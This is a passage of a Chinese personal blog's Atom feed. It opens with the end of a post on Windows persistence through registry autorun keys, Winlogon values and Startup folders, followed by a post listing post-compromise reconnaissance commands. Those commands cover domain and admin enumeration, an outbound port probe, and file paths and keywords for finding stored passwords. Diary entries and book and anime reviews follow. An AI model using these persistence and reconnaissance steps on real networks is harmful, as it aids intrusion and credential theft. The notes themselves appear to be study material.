Folders</code><br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code><br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></p><p>设置服务启动项注册表位置如下：<br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code><br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices</code><br><code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices</code></p><p>用户自启动位置<br><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit</code> 、 <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell</code> , 其中 <code>Userinit</code> 键允许指定用逗号分隔的多个程序。</p><p>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：<br><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive</code><br><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure</code><br><code>HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut</code><br><code>HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE</code></p><h3 id="基于特定目录的自启动"><a href="#基于特定目录的自启动" class="headerlink" title="基于特定目录的自启动"></a>基于特定目录的自启动</h3><p>自启动目录， <code>C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code> 目录对特定用户生效， <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code> 对所有用户生效。在NT6以前，两个目录为 <code>C:\Documents and Settings\Username\Start Menu\Programs\StartUp</code> &#x2F; <code>C:\Documents and Settings\All Users\Start Menu\Programs\StartUp</code> 。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;进入内网后，要想办法保持权限。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="持久化" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8C%81%E4%B9%85%E5%8C%96/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之信息收集</title>
    <link href="http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2023-08-19T16:00:00.000Z</published>
    <updated>2023-08-25T07:50:34.972Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学习内网渗透是跟随蜗牛学苑的视频，没有自己做笔记，所以忘得差不多了。在此从头开始。</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>主机名： <code>hostname</code><br>查询所有计算机名称 <code>dsquery computer</code><br>查看配置及补丁信息：<br><code>systeminfo</code><br><code>wmic qfe get description,installedOn /format:csv</code></p><p>查看版本： <code>ver</code></p><p>进程信息：<br><code>tasklist /svc</code><br><code>wmic process get caption,executablepath,commandline /format:csv</code><br><code>get-process</code></p><p>查看所有环境命令： <code>set</code></p><p>查看计划任务： <code>schtasks /QUERY /fo LIST /v</code></p><p>查看安装驱动： <code>DRIVERQUERY</code></p><p>查看操作系统信息：<br>架构： <code>wmic os get osarchitecture</code><br>系统名： <code>wmic os get caption</code></p><p>查看逻辑盘： <code>wmic logicaldisk get caption</code><br>查看安装的软件信息： <code>wmic product get name,version</code></p><p>查看服务信息：<br><code>wmic service list brief</code><br><code>sc query</code><br><code>Get-WmiObject win32_service | select PathName</code></p><h2 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h2><p>获取当前组的计算机名： <code>net view</code> (失败原因可能为防病毒程序或防火墙配置阻止与服务器的连接，禁用功能发现服务等。)<br>网络发现： <code>net view /all</code><br>查看所有域： <code>net view /domain</code><br>域信任信息： <code>nltest /domain_trusts</code><br>定位域控： <code>net time /domain</code><br>查看域中的用户名： <code>dsquery user</code><br>查询域组名称： <code>net group /domain</code><br>查询域管理员： <code>net group &quot;Domain Admins&quot; /domain</code></p><p>域控信息：<br><code>nltest /dclist:xx</code><br><code>Get-NetDomain</code><br><code>Get-NetDomainController</code><br><code>net group &quot;Domain controllers&quot;</code></p><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p>查看用户：<br><code>net user</code><br><code>woami</code> &#x2F; <code>whoami /priv</code> &#x2F; <code>whoami /all</code><br><code>wmic useraccount get /ALL /format:csv</code></p><p>用户特权信息： <code>whoami /priv</code><br>查看当前权限： <code>net localgroup administrators</code><br>查看在线用户： <code>quser</code> &#x2F; <code>qwinsta</code> &#x2F; <code>query user</code><br>查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域： <code>net config Workstation</code><br>ACL信息： <code>Get-ACL</code><br>查看用户SID：<br><code>whoami /user</code><br><code>wmic useraccount get name,sid</code></p><h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><p>网卡信息： <code>ipconfig</code><br>ARP表： <code>arp -a</code><br>路由表： <code>route print</code><br>监听的端口： <code>netstat -ano</code><br>端口信息：<br><code>Get-NetTCPConnection</code><br>DNS缓存：<br><code>ipconfig /displaydns</code><br><code>Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache</code></p><p>探测出网情况：<br><code>powershell -c &quot;1..65535 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;allports.exposed&#39;,$_)) $_ &#125; 2&gt;$null&quot;</code></p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>查看防火墙状态： <code>netsh advfireall show allprofiles</code><br>防火墙日志目录： <code>netsh firewall show logging</code><br>防火墙规则：<br><code>netsh advfirewall firewall show rule name=all</code><br><code>netsh firewall show config</code><br><code>netsh firewall show state</code></p><h2 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h2><p>Windows RDP连接记录<br>浏览器中保存的账号密码<br>系统密码管理器中的各种密码<br>无人值守安装文件中的密码信息：<br><code>C:\sysprep.inf</code><br><code>C:\sysprep\sysprep.xml</code><br><code>C:\Windows\Panther\Unattend\Unattended.xml</code><br><code>C:\Windows\Panther\Unattended.xml</code></p><h2 id="票据信息"><a href="#票据信息" class="headerlink" title="票据信息"></a>票据信息</h2><p><code>cmdkey /l</code><br>klist<br>msf meterpreter</p><h2 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h2><p>文档<br>xlsx &#x2F; xls<br>docx &#x2F; doc<br>pptx &#x2F; ppt<br>vsdx &#x2F; vsd<br>md &#x2F; txt</p><p>压缩文件<br>zip &#x2F; rar &#x2F; 7z</p><p>VPN配置<br>ovpn</p><p>代码<br>py &#x2F; php &#x2F; jsp &#x2F; aspx &#x2F; asp &#x2F; sql</p><p>配置文件<br>conf &#x2F; ini &#x2F; xml</p><p>特定关键字<br>账号 &#x2F; 账户 &#x2F; 登录 &#x2F; login &#x2F; user<br>密码 &#x2F; pass<br>代码 &#x2F; 文档 &#x2F; 交接 &#x2F; 备份 &#x2F; git &#x2F; svn<br>邮箱 &#x2F; 通讯录 &#x2F; 集群 &#x2F; 办公<br>代理 &#x2F; 内网 &#x2F; VPN<br>设备 &#x2F; 资产<br>系统 &#x2F; 运维 &#x2F; 拓扑 &#x2F; 网络 &#x2F; IT<br>后台 &#x2F; 管理员 &#x2F; 数据库<br>监控 &#x2F; 隔离 &#x2F; 防火墙 &#x2F; 网闸 &#x2F; 巡检</p><h2 id="局域网存活主机"><a href="#局域网存活主机" class="headerlink" title="局域网存活主机"></a>局域网存活主机</h2><p>NetBIOS扫描<br>OXID扫描</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>启用的共享文件夹<br>回收站<br>最近运行的命令<br>访问文件历史记录<br>查看补丁安装情况<br><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p><p>日志与事件信息<br><code>wevtuil</code><br><code>eventvwr</code></p><p>注册表信息<br><code>reg</code></p><p>安装的各类agent监控软件<br>安装的杀毒软件<br>查看&#x2F;设置后缀失联<br><code>assoc</code><br><code>assoc .ext=example</code></p><p>PowerShell版本<br>.Net版本<br>Wi-Fi密码</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前学习内网渗透是跟随蜗牛学苑的视频，没有自己做笔记，所以忘得差不多了。在此从头开始。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="信息收集" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>觉悟的样子</title>
    <link href="http://example.com/2023/08/16/Diary_20230816/"/>
    <id>http://example.com/2023/08/16/Diary_20230816/</id>
    <published>2023-08-15T16:00:00.000Z</published>
    <updated>2023-08-17T02:52:08.379Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我没有觉悟。</p><span id="more"></span><h1 id="有觉悟表现出的几个特征"><a href="#有觉悟表现出的几个特征" class="headerlink" title="有觉悟表现出的几个特征"></a>有觉悟表现出的几个特征</h1><ol><li>早上醒了或闹钟响了便起床，不会醒了之后继续睡。</li><li>原本诱惑的东西吸引力弱了很多。</li><li>不会三心二意。</li></ol><h1 id="现在"><a href="#现在" class="headerlink" title="现在"></a>现在</h1><p>现在的我没有觉悟，我能感觉到。<br>说到底，觉悟这种东西，不是凭借外界的什么就能达到，而是一种自发涌现的力量。<br>没有，那就是没有。</p><h1 id="前进"><a href="#前进" class="headerlink" title="前进"></a>前进</h1><p>大多数人，应该都是没有觉悟的。支撑人们前进的往往是外界因素，比如通过什么强制自己做什么，或者不做什么就会发生什么糟糕的事。</p><p>人等不到觉悟，便由锁链拉扯前行。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;我没有觉悟。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>重要</title>
    <link href="http://example.com/2023/08/15/Diary_20230815/"/>
    <id>http://example.com/2023/08/15/Diary_20230815/</id>
    <published>2023-08-14T16:00:00.000Z</published>
    <updated>2023-08-16T04:26:38.611Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天只说一点点。</p><span id="more"></span><h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>如果某些事足够重要，即使情况不利于你，也应当去做。    –Elon Musk</p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>写自己思考的东西，自己的看法，是为了不要忘记，为了强化自己的观点。<br>如果想到了什么，却不去记述，那么灵感很快会转瞬即逝。</p><p>我依旧想起了在很多年前的高中，我写了一首诗。拿给了一位朋友看。朋友说，即使平常不看诗，也觉得这首诗写得很好。水平大概是和顾城的“黑夜给了我黑色的眼睛，我却用它来寻找光明。”同等程度。<br>但是后来不知为何，我把所写的诗弄丢了，而我也再也想不起来，我自己曾经写的那首诗。<br>我感到十分可惜。</p><p>帕斯卡尔说，人是一根会思考的芦苇。</p><p>表达什么观点，高尚或卑劣，成熟或幼稚，都没有关系。重要的是去表达。<br>用笛卡尔的这句话做结尾很恰当：我思故我在。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;今天只说一点点。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>进展</title>
    <link href="http://example.com/2023/08/13/Diary_20230813/"/>
    <id>http://example.com/2023/08/13/Diary_20230813/</id>
    <published>2023-08-12T16:00:00.000Z</published>
    <updated>2023-08-13T18:01:20.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有开头，进展不太顺利。</p><span id="more"></span><h1 id="习惯"><a href="#习惯" class="headerlink" title="习惯"></a>习惯</h1><p>习惯未成，感觉有些别扭。<br>明天约束一下自己。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;有开头，进展不太顺利。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>欢迎加入NHK--困境中的挣扎与释然</title>
    <link href="http://example.com/2023/08/12/%E6%AC%A2%E8%BF%8E%E5%8A%A0%E5%85%A5NHK--%E5%AE%B6%E9%87%8C%E8%B9%B2%E7%9A%84%E6%8C%A3%E6%89%8E/"/>
    <id>http://example.com/2023/08/12/%E6%AC%A2%E8%BF%8E%E5%8A%A0%E5%85%A5NHK--%E5%AE%B6%E9%87%8C%E8%B9%B2%E7%9A%84%E6%8C%A3%E6%89%8E/</id>
    <published>2023-08-11T16:00:00.000Z</published>
    <updated>2023-08-12T16:58:26.632Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_10.png" alt="中原岬"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这部是我打算在近段时间看的最后一部完结动画。这是一部将近20年前的动画作品。看完之后挺满足的。</p><h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><p>故事的主人公是22岁大学辍学的家里蹲男人佐藤达广。<br>动画里大致上有9个故事：</p><ol><li>男主受到女主（中原岬）邀请帮助他走出家里蹲状态。</li><li>男主与男二邻居高中学弟（山崎薰）一起制作美少女游戏。</li><li>男主与女主假扮情侣真约会。</li><li>男主与女二高中学姐（柏瞳）一起相约组团自杀。</li><li>男主想通过玩网游赚钱陷入痴迷状态。</li><li>男主被高中班长（小林惠）骗入传销。</li><li>男二回家继承家业。</li><li>男主拒绝女二学姐的外遇邀请。</li><li>男主走出家里蹲状态并了解到女主过去。</li></ol><p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_3.png" alt=" "></p><h1 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h1><p>本部作品中的角色都很有趣。</p><p><strong>男主（佐藤达广）</strong><br>首先这是个真废物，恶心人的品质有不少。<br>比如：下载色图到电脑磁盘塞满，天天打游戏不分昼夜，对不切实际的幻想想入非非，傻到被传销组织连骗两次…<br>如果只有其中的一两点倒还好，他是各样均沾，让我对这位男主都有点反感了。<br>不过，这个人也不是一无是处，他拒绝了对学姐外遇的邀约，舍身拯救了女主。</p><p><strong>女主（中原岬）</strong><br>简直像女神&#x2F;天使一样。<br>当然，并不是说女主是完美无缺的人。实际上，就精神状态而言，女主只比男主好上一些罢了。女主是18岁高中辍学的中原岬。<br>之所以，要帮助男主摆脱家里蹲状态，也是为了能够证明自己并非一无是处。</p><p><strong>女二（柏瞳）</strong><br>是个坏女人呢。<br>男主的高中学姐，可谓是男主的负面源头之一。拉上男主去组团跳海自杀，诱惑男主外遇…<br>但不得不说，学姐也正因为她的坏，有了别具一格的魅力。<br>这种魅力让男主为她一起自杀事后却毫无怨言。</p><p><strong>男二（山崎薰）</strong><br>不甘平凡却又归于平凡。<br>可以说在他的圈子里是个“怪胎”。不屑与对随波逐流的人为伍，抛弃继承家业来到东京逐梦游戏制作。<br>他是个有决心有毅力的人。因为拒绝一眼望得到头的人生自行选择了更艰苦却热爱的事业。最终由于家庭因素放弃了梦想，安然接受一眼到头的人生。<br>其实我内心与这个角色有些共鸣，我也是拒绝一眼到头的人生，可是否过10年或20年之后，又会像他一样安然接受了呢？<br>要说没有一点这种恐惧，那是自欺欺人。</p><p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_4.png" alt=" "></p><h1 id="感受"><a href="#感受" class="headerlink" title="感受"></a>感受</h1><p>就我看来，这部动画本质上讲的是<strong>对现实的释然</strong>。</p><p>把男主这个社会底层作为主要观察对象，来表现一些人的生存方式，最终对现实的释然。<br>生存方式里，男主是逃避，男二是逐梦，女主是自我欺骗，女二是隐忍与发泄。</p><p>男主自从不去大学后，对外界的眼光越发在意到难以与陌生人打交道的地步。<br>结果就是成天在租的屋子里不去工作依靠父母救济。<br>他知道应该如何解决问题，那就是去找一份工作。但因为仍旧有着退路（指父母的接济），所以迟迟没有付诸行动。<br>最终父母把他的生活费断掉之后，他饿了三天最终去找了一份工作。<br>他逃避着一切：逃避世人眼光成了无业游民，逃避承认自己是家里蹲而选择做美少女游戏，逃避被母亲看到不堪一面而制造谎言，逃避现实而喜欢上了游戏中的虚拟人物，逃避正确的路而被传销组织二度欺骗…<br>我们可以看到，逃避最终没有效果，是因生存的环境消失而自己又有着生存欲望而被迫正视现实。<br>曾经看到某个电视剧的名称叫做“逃避虽然可耻但是有用”，我对这个名称嗤之以鼻。<br>我曾经也逃避过，我不喜欢麻烦事，所以为了逃避麻烦事，一直想办法往后拖。<br>然而这没有意义，最终反而给我造成了不得不面对的更大麻烦。<br>经历了那样的教训后，我从此明白逃避，是一条不可选择的路。或者说，长期逃避而不去解决，是绝对不能做的，否则最终只有死路一条。</p><p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_7.png" alt=" "></p><p>归根结底，所有人不都是对现实不满，才会做出不合常理的举动吗？<br>症状轻的人，即使不满也会去努力改变；症状重的人，直接放弃了生存的欲望。<br>男二对现实不满于是去改造，他失败了，接受了，释然了。别离东京的最后，用一种自我毁灭的方式辞别了他喜欢的女生。<br>女二对现实放弃了希望，于是组团跳海自杀，虽然挽回了，但是她生活里的不满并没有消失，她仍然感到压力大与心累。她是物质上的成功人士：是公务员，有着正常的丈夫，住着豪宅。可她的精神很糟糕，遭受职场中人的排斥，对象常常因为工作繁忙而不能陪她，吃着精神方面的药物。想通过搞外遇来缓解这种压力，幸而男主没有接受。<br>男主对现实不满，他是边逃避边改造，一来不想与外界接触，二来又不甘于成为家里蹲。在这种矛盾的心理下，才会有时好像进步了有时又在退步。<br>女主对现实一开始没有放弃希望，他拯救男主，想以此来证明自己的价值，并且想通过这种方式来让男主依赖自己，好让自己不寂寞。然而男主成功走出家里蹲后，没有依赖女主，他也不认为这是一种健康的生存方式。结果导致了女主的绝望，让女主走向自杀。但幸好最终男女主互相释然了，接受了这样的现实。</p><p>他们没有改造现实的能力，只是对现实释然了。</p><p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_1.png" alt=" "><br><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_5.png" alt=" "><br><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_9.png" alt=" "></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_10.png&quot; alt=&quot;中原岬&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="动画" scheme="http://example.com/categories/%E5%8A%A8%E7%94%BB/"/>
    
    
    <category term="动画" scheme="http://example.com/tags/%E5%8A%A8%E7%94%BB/"/>
    
  </entry>
  
  <entry>
    <title>一九八四</title>
    <link href="http://example.com/2023/08/10/Diary_20230810/"/>
    <id>http://example.com/2023/08/10/Diary_20230810/</id>
    <published>2023-08-09T16:00:00.000Z</published>
    <updated>2023-08-10T17:14:00.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>又看完了一本书。</p><span id="more"></span><h1 id="一九八四"><a href="#一九八四" class="headerlink" title="一九八四"></a>一九八四</h1><p>今天看完了《一九八四》这本书，分了3天看完的，今天看的是主人公最痛苦的一段，但却是我看的最快的一段。<br>从主人公怀有对未来的憧憬，到面如死灰。也只是过了一个月。</p><p>对比乔治奥威尔的《动物农场》，这本更加复杂也更加恐怖。不同的是，动物农场描绘的画卷是逐渐演变为腐败的过程。而一九八四描绘的画卷是已然成形了的终极形态。一切都处于压抑之中。</p><p>有点晚了，不太想写什么了，放点本书名言吧。</p><h1 id="名言"><a href="#名言" class="headerlink" title="名言"></a>名言</h1><p>老大哥在看着你。</p><p>战争即和平<br>自由即奴役<br>无知即力量</p><p>所谓自由就是可以说二加二等于四的自由。</p><h1 id="有感触的文字"><a href="#有感触的文字" class="headerlink" title="有感触的文字"></a>有感触的文字</h1><p>这也不无理由，因为每星期《泰晤士报》总有一条消息报道有个偷听父母讲话的小密探——一般都称为“小英雄”——偷听到父母的一些见不得人的话，向思想警察作了揭发。</p><p>思想罪不会带来死亡：思想罪本身就是死亡。</p><p>如果党能够插手到过去之中，说这件事或那件事从来没有发生过(it never happened)，那么这肯定比仅仅拷打或者死亡更加可怕。</p><p>如果别人都相信党说的谎话——如果所有记录都这么说——那么这个谎言就载入历史而成为真理。</p><p>群众从来不会自动起来造反，他们从来不会由于身受压迫而起来造反。说真的，只要不给他们比较的标淮，他们从来不会意识到自己受压迫。</p><p>如果他认为(thinks)他已离地飘浮起来，如果我同时认为(think)我看到他离地飘浮起来，那么这件事就真的发生了。</p><p>他鼻梁两侧流下了带着酒气的泪。但是没有事，一切都很好，斗争已经结束了。他战胜了自己。他热爱老大哥。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不要觉得这样的情节离现实很远。</p><p>一个小例子：老舍在美国读完这本书，认为这种情节很荒谬，然而17年后因为文化大革命投湖自杀。</p><p>不去抗争，悲哀终临其身。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;又看完了一本书。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
  <entry>
    <title>宅</title>
    <link href="http://example.com/2023/08/09/Diary_20230809/"/>
    <id>http://example.com/2023/08/09/Diary_20230809/</id>
    <published>2023-08-08T16:00:00.000Z</published>
    <updated>2023-08-09T17:29:32.685Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>hvv开始了，没有参加，从旁看热热闹闹轰轰烈烈。</p><span id="more"></span><h1 id="宅"><a href="#宅" class="headerlink" title="宅"></a>宅</h1><p>说起来，我现在应该算是一种宅形态了。</p><p>为什么会变成这样呢？<br>这让我有些纳闷儿。</p><p>2年前我大概还不是这样，每天早上有跑步，会与人露营或旅游，也会与朋友偶尔在城市里看看电影，探索一些新开餐厅之类的。<br>完全是一副积极健康向上的模样。</p><p>现在的我呢？一想到跑步就感觉浑身沾满了汗水，有人邀请旅游会拒绝，也不邀请别人出去玩。</p><p>完全变成了一座孤岛。</p><p>我想，这不是一种好迹象，还是来分析一下原因吧。</p><ol><li>每天睡得晚，导致难以早起跑步。</li><li>惰性与惯性混合，越懒越不想动，越不想动越懒。</li><li>对人的交际不重视，没有想和别人一起做什么的欲望。</li><li>消极负面思想，总是抱持着虚无的念头，对事物没什么期望。（根本原因）</li></ol><p>大概就是这样。</p><p>解决方法的话，巩固亲朋好友的关系，交新朋友也许能改善不少。（但是一想到这些马上就有消极的念头冒出来了，简直无可救药&#x2F;(ㄒoㄒ)&#x2F;）</p><p>再这么下去，迟早会被负面给吞噬的…</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;hvv开始了，没有参加，从旁看热热闹闹轰轰烈烈。&lt;/p&gt;</summary>
    
    
    
    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
    
    
    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
    
    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
    
  </entry>
  
</feed>
